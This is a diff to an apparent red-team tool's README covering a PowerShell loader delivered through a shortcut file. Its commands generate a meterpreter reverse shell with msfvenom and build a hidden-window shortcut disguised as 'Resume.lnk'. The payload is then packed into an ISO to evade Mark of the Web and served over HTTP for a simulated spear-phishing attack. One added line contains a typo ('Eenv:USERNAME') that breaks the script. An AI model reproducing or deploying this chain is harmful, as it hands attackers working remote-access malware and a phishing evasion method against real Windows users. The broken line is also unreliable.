@@ -117,7 +117,9 @@ Supported container/archive formats:
 
 #### 2.4.1 - Powershell Loader via Shortcut Lnk
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1
+```
 
 Transfer the generated powershell reverse shell to the windows box to create .lnk shortcut and pack them into an ISO file
 
@@ -126,7 +128,7 @@ Transfer the generated powershell reverse shell to the windows box to create .ln
 ---
 
 ```powershell
-$shortcutPath = "C:\Users\" + $env:username + "\Desktop\Resume.lnk"  
+$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\Resume.lnk"  
 $WshShell = New-Object -ComObject WScript.Shell  
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)  
 $Shortcut.TargetPath = 'conhost.exe'  
@@ -135,15 +137,19 @@ $Shortcut.Description = "A shortcut backdoor"
 $Shortcut.IconLocation = 'C:\path\to\document.docx'  
 $Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload  
 $Shortcut.WindowStyle = 7  
-$Shortcut.WorkingDirectory = "C:\Users\" + $env:username + "\Public"  
+$Shortcut.WorkingDirectory = "C:\Users\" + Eenv:USERNAME + "\Public"  
 $Shortcut.Save()
 ```
 
-`C:\PackMyPayload> python PackMyPayload.py --hide C:\path\to\directory\shell.ps1 --out-format iso C:\path\to\directory ISO_File.iso -v`
+```
+C:\PackMyPayload> python PackMyPayload.py --hide C:\path\to\directory\shell.ps1 --out-format iso C:\path\to\directory ISO_File.iso -v
+```
 
 Then copy the ISO File to your attacker machine and start a web server to simulate the spear phishing attack then finally you'll see **MOTW (Mark of the Web)** has not contaminated the `.lnk` shortcut file
 
-`$ sudo python -m http.server 80`
+```
+$ sudo python -m http.server 80
+```
 
 ---
 ## References
